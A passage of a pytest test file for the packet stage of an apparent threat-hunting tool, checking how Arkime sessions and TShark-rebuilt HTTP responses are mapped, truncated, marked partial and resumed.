    rows = [_row(50000, T0.timestamp(), uri=None), _row(50001, T0.timestamp()), _row(50002, T0.timestamp())]
    repo, summary = _stage(tmp_path, monkeypatch, rows=rows)
    assert summary["missing_required"] == 1
    _partial(repo, summary, "lacked a field the rule needs")


def test_unmapped_response_is_partial(tmp_path, monkeypatch):
    rows = [_row(50000 + i, T0.timestamp()) for i in range(3)] + [_row(61000, T0.timestamp())]
    repo, summary = _stage(tmp_path, monkeypatch, rows=rows)
    assert summary["unmapped_responses"] == 1
    _partial(repo, summary, "mapped to no selected session")


def test_frame_with_several_responses_is_partial(tmp_path, monkeypatch):
    two = _row(50000, T0.timestamp())
    two["http.response.code"] = ["200", "200"]
    two["http.file_data"] = [SCRIPT.hex(), SCRIPT.hex()]
    rows = [two, _row(50001, T0.timestamp()), _row(50002, T0.timestamp())]
    repo, summary = _stage(tmp_path, monkeypatch, rows=rows)
    assert summary["unseparable_frames"] == 1
    _partial(repo, summary, "cannot be separated")


def test_refused_download_is_partial_and_counted_once(tmp_path, monkeypatch):
    repo, summary = _stage(tmp_path, monkeypatch, _Packets(error="Arkime refused packet download (403)"))
    assert summary["failed_batches"] == 1 and summary["truncated_batches"] == 0 and summary["fetched_sessions"] == 0
    _partial(repo, summary, "not examined: Arkime refused packet download")


def test_capped_and_cut_short_batch_counts_once(tmp_path, monkeypatch):
    repo, summary = _stage(tmp_path, monkeypatch, _Packets(capped=True))
    assert summary["truncated_batches"] == 1 and summary["failed_batches"] == 0
    _partial(repo, summary, "download byte cap")


# I1: rows map within their batch; a shared 4-tuple is resolved by the session's time span, or is ambiguous

def test_same_tuple_sessions_are_told_apart_by_time(tmp_path, monkeypatch):
    early = _session("241118-EARLY0000000", 50000, T0 - timedelta(minutes=50), T0 - timedelta(minutes=40))
    late = _session("241118-LATE00000000", 50000, T0, T0 + timedelta(minutes=5))
    rows = [_row(50000, (T0 - timedelta(minutes=45)).timestamp()), _row(50000, (T0 + timedelta(minutes=1)).timestamp())]
    repo, summary = _stage(tmp_path, monkeypatch, sessions=[early, late], rows=rows)
    assert summary["status"] == "complete" and summary["responses"] == 2 and summary["sessions_with_responses"] == 2
    found = next(c for c in repo.candidates("h1") if c["rule_id"] == RULE)
    events = [TypedEvent.model_validate(r["event"]) for r in repo.events_by_ids(found["event_ids"])]
    by_time = {e.ts: e.get("arkime.session_id") for e in events}
    assert by_time == {T0 - timedelta(minutes=45): early["_id"], T0 + timedelta(minutes=1): late["_id"]}


def test_segments_of_one_session_are_one_session_and_cite_the_segment_holding_the_response(tmp_path, monkeypatch):
    # Arkime saves a long session as segments that keep the original firstPacket
    seg1 = _session("241118-SEG1AAAAAAAA", 50000, T0 - timedelta(minutes=30), T0 - timedelta(minutes=20))
    seg2 = _session("241118-SEG2AAAAAAAA", 50000, T0 - timedelta(minutes=30), T0 + timedelta(minutes=10))
    rows = [_row(50000, (T0 - timedelta(minutes=25)).timestamp()), _row(50000, (T0 + timedelta(minutes=5)).timestamp())]
    repo, summary = _stage(tmp_path, monkeypatch, sessions=[seg2, seg1], rows=rows)
    assert summary["status"] == "complete" and summary["ambiguous_responses"] == 0
    assert summary["logical_sessions"] == 1 and summary["sessions_with_responses"] == 1 and summary["responses"] == 2
    found = next(c for c in repo.candidates("h1") if c["rule_id"] == RULE)
    events = [TypedEvent.model_validate(r["event"]) for r in repo.events_by_ids(found["event_ids"])]
    assert {e.ts: e.get("arkime.session_id") for e in events} == {
        T0 - timedelta(minutes=25): seg1["_id"], T0 + timedelta(minutes=5): seg2["_id"]}


def test_multi_segment_sessions_are_their_own_unit_in_time_order():
    lone = [_session(f"241118-LONE{i:08d}", 40000 + i) for i in range(25)]
    segs = [_session(f"241118-SEGS{i:08d}", 50000, T0, T0 + timedelta(minutes=10 - i)) for i in range(10)]
    units = hp._units(segs[:3] + lone + segs[3:])
    assert [(merged, len(docs)) for merged, docs in units] == [(True, 10), (False, 20), (False, 5)]
    assert [d["_id"] for d in units[0][1]] == [s["_id"] for s in reversed(segs)]       # lastPacket ascending


def test_segments_are_fetched_one_by_one_in_order_and_merged(tmp_path, monkeypatch):
    late = _session("241118-SEGLATE00000", 50000, T0 - timedelta(minutes=30), T0 + timedelta(minutes=10))
    early = _session("241118-SEGEARLY0000", 50000, T0 - timedelta(minutes=30), T0 - timedelta(minutes=20))
    packets, merges = _Packets(), []
    _stage(tmp_path, monkeypatch, packets, sessions=[late, early], rows=[], merges=merges)
    assert packets.calls == [[early["_id"]], [late["_id"]]]
    assert merges == [["batch-0-seg0.pcap", "batch-0-seg1.pcap"]]
    assert not list((tmp_path / "stage").glob("romulus-pcap-*"))


def test_a_long_session_beyond_the_byte_budget_is_truncated_and_partial(tmp_path, monkeypatch):
    segs = [_session(f"241118-SEG{i:011d}", 50000, T0 - timedelta(minutes=30), T0 + timedelta(minutes=i))
            for i in range(5)]
    packets = _Packets(max_bytes=len(PCAP) * 2 - 10)            # the second segment is cut at the budget
    repo, summary = _stage(tmp_path, monkeypatch, packets, sessions=segs, rows=[_row(50000, T0.timestamp())])
    assert len(packets.calls) == 2 and summary["truncated_batches"] == 1
    _partial(repo, summary, "one session's 5 segments) capture incomplete (download byte cap)")


def test_a_session_that_exactly_fills_the_budget_is_complete(tmp_path, monkeypatch):
    segs = [_session(f"241118-SEG{i:011d}", 50000, T0 - timedelta(minutes=30), T0 + timedelta(minutes=i))
            for i in range(2)]
    packets = _Packets(max_bytes=len(PCAP) * 2)
    _repo, summary = _stage(tmp_path, monkeypatch, packets, sessions=segs, rows=[_row(50000, T0.timestamp())])
    assert len(packets.calls) == 2 and summary["truncated_batches"] == 0


def test_fetch_honours_a_smaller_per_call_budget(tmp_path):
    out = _fetcher(tmp_path, lambda r: httpx.Response(200, content=PCAP + b"x" * 5000)).fetch(
        ["241118-AAAAAAAAAAAA"], tmp_path / "a.pcap", max_bytes=100)
    assert out.capped and out.path.stat().st_size == 100


@pytest.mark.parametrize("fields", [{}, {"server": {}}, {"dstDataBytes": 0}, {"server": {"bytes": None}}])
def test_unreadable_arkime_reply_fields_are_partial_not_request_only(tmp_path, monkeypatch, fields):
    sess = _session("241118-SESS00000002", 50002)
    sess["_source"].update(fields)
    sessions = [_session("241118-SESS00000000", 50000), _session("241118-SESS00000001", 50001), sess]
    request = {"frame.number": ["3"], "frame.time_epoch": [str(T0.timestamp())],
               "frame.protocols": ["eth:ethertype:ip:tcp:http"], "ip.src": ["172.17.100.121"],
               "tcp.srcport": ["50002"], "ip.dst": ["192.0.2.174"], "tcp.dstport": ["80"],
               "http.request.method": ["GET"], "http.response.code": []}
    rows = [_row(50000, T0.timestamp()), _row(50001, T0.timestamp()), request]
    repo, summary = _stage(tmp_path, monkeypatch, sessions=sessions, rows=rows)
    assert summary["sessions_request_only"] == 0 and summary["sessions_unrebuilt_response"] == 1
    _partial(repo, summary, "could not rebuild")


def test_a_response_arkime_saw_but_tshark_could_not_rebuild_is_partial(tmp_path, monkeypatch):
    streamed = _session("241118-SESS00000002", 50002)
    streamed["_source"]["http"] = {"statuscode": [200]}
    streamed["_source"]["server"] = {"bytes": 426}
    sessions = [_session("241118-SESS00000000", 50000), _session("241118-SESS00000001", 50001), streamed]
    request = {"frame.number": ["3"], "frame.time_epoch": [str(T0.timestamp())],
               "frame.protocols": ["eth:ethertype:ip:tcp:http"], "ip.src": ["172.17.100.121"],
               "tcp.srcport": ["50002"], "ip.dst": ["192.0.2.174"], "tcp.dstport": ["80"],
               "http.request.method": ["GET"], "http.response.code": []}
    rows = [_row(50000, T0.timestamp()), _row(50001, T0.timestamp()), request]
    repo, summary = _stage(tmp_path, monkeypatch, sessions=sessions, rows=rows)
    assert summary["sessions_unrebuilt_response"] == 1 and summary["sessions_request_only"] == 0
    _partial(repo, summary, "a response Arkime recorded that TShark could not rebuild")
    assert summary["unexamined_sessions"] == {TARGET: {"unrebuilt_response": [streamed["_id"]]}}
    assert _cell(repo)["detail"]["unexamined_sessions"] == {"unrebuilt_response": [streamed["_id"]]}


def test_overlapping_same_tuple_sessions_are_ambiguous_and_partial(tmp_path, monkeypatch):
    a = _session("241118-AAAAAAAAAAAA", 50000, T0 - timedelta(minutes=10), T0 + timedelta(minutes=10))
    b = _session("241118-BBBBBBBBBBBB", 50000, T0 - timedelta(minutes=5), T0 + timedelta(minutes=10))
    repo, summary = _stage(tmp_path, monkeypatch, sessions=[a, b], rows=[_row(50000, T0.timestamp())])
    assert summary["ambiguous_responses"] == 1
    _partial(repo, summary, "matched more than one session")


def test_responses_are_only_mapped_to_sessions_of_their_own_batch(tmp_path, monkeypatch):
    # 21 sessions -> two batches; the stubbed TShark returns the row for session 0 in both batches.
    sessions = [_session(f"241118-SESS{i:08d}", 50000 + i) for i in range(21)]
    rows = [_row(50000 + i, T0.timestamp()) for i in range(21)]
    _repo, summary = _stage(tmp_path, monkeypatch, sessions=sessions, rows=rows)
    assert summary["responses"] == 21 and summary["unmapped_responses"] == 21   # second batch: 20 foreign rows,
    # first batch: 1 foreign row; no row was credited to a session outside its batch


def test_responses_outside_the_window_are_counted_not_partial(tmp_path, monkeypatch):
    rows = [_row(50000 + i, (T0 - timedelta(hours=3)).timestamp() if i == 0 else T0.timestamp()) for i in range(3)]
    _repo, summary = _stage(tmp_path, monkeypatch, rows=rows)
    assert summary["outside_window"] == 1 and summary["status"] == "complete"


# I9: memory stays bounded to the events the rule may cite

def test_only_raw_copies_the_rule_retains_are_kept(tmp_path):
    s = Settings(home=tmp_path)
    run = hp._Target(s, TARGET, Window(start=T0 - timedelta(hours=1), end=T0 + timedelta(hours=1)), tmp_path,
                     _Packets(), lambda: None)
    sessions = [_session(f"241118-SESS{i:08d}", 50000 + i) for i in range(4)]
    rows = [_row(50000, T0.timestamp())] + [_row(50000 + i, T0.timestamp(), body=b"plain prose") for i in (1, 2, 3)]
    import romulus.hunt.packets as mod
    original = mod.run_tshark
    mod.run_tshark = lambda s, pcap, query, dirs, http_ports=(): pk.TsharkResult(rows=rows)
    try:
        run.run(sessions)
    finally:
        mod.run_tshark = original
    assert run.c["responses"] == 4 and len(run.raw_sources) == 1


# I7 and the hunt: a partial or failed packet stage makes the hunt partial; resume re-runs an unfinished stage

class _FakeSweep:
    def __init__(self, *_a, **_k):
        self.partial_reasons, self.stats = [], {"partitions": 0}

    def run_target(self, _t):
        raise AssertionError("no targets")

    def finalize(self):
        return None


def _hunt(tmp_path):
    settings = Settings(agent_mode="off", home=tmp_path)
    repo = hunt_run.open_repo(settings)
    start = T0
    repo.create_hunt("h1", {"window": {"start": start.isoformat(), "end": (start + timedelta(hours=1)).isoformat()},
                            "targets": [], "source_profiles": {}, "budgets": {}}, "digest", "test")
    return settings


def test_partial_packet_stage_makes_the_hunt_partial(tmp_path, monkeypatch):
    settings = _hunt(tmp_path)
    monkeypatch.setattr(hunt_run, "Sweep", _FakeSweep)
    monkeypatch.setattr(hunt_run, "run_packet_stage", lambda *a, **k: {
        "status": "partial", "finished": True, "partial_reasons": ["x: 1 fetched session(s) had no HTTP response"]})
    out = hunt_run.run_hunt(settings, "h1")
    hunt = hunt_run.open_repo(settings).get_hunt("h1")
    assert out["execution_state"] == "partial" and "packet_stage:partial" in out["partial_reasons"]
    assert "packet stage partial" in hunt["stop_reason"]


def test_crashed_packet_stage_is_rerun_on_resume_and_a_finished_one_is_not(tmp_path, monkeypatch):
    settings = _hunt(tmp_path)
    monkeypatch.setattr(hunt_run, "Sweep", _FakeSweep)
    calls = []

    def stage(*_a, **_k):
        calls.append(1)
        if len(calls) == 1:
            raise RuntimeError("boom")
        return {"status": "complete", "finished": True, "partial_reasons": []}

    monkeypatch.setattr(hunt_run, "run_packet_stage", stage)
    first = hunt_run.run_hunt(settings, "h1")
    assert first["execution_state"] == "partial" and "packet_stage:failed" in first["partial_reasons"]
    resumed = hunt_run.resume_hunt(settings, "h1")
    assert len(calls) == 2 and resumed["execution_state"] == "completed_within_scope"


def test_a_finished_partial_packet_stage_is_not_rerun_on_resume(tmp_path, monkeypatch):
    settings = _hunt(tmp_path)
    monkeypatch.setattr(hunt_run, "Sweep", _FakeSweep)
    calls = []

    def stage(*_a, **_k):
        calls.append(1)
        return {"status": "partial", "finished": True, "partial_reasons": ["x: 1 response(s) mapped to no session"]}

    monkeypatch.setattr(hunt_run, "run_packet_stage", stage)
    hunt_run.run_hunt(settings, "h1")
    resumed = hunt_run.resume_hunt(settings, "h1")
    assert len(calls) == 1 and resumed["execution_state"] == "partial"
    assert "packet_stage:partial" in resumed["partial_reasons"]


def test_stale_packet_directories_are_cleared(tmp_path):
    stale = tmp_path / "romulus-pcap-old"
    stale.mkdir()
    old = time.time() - 7 * 3600
    os.utime(stale, (old, old))
    assert clear_stale_stages(tmp_path) == 1 and not stale.exists()
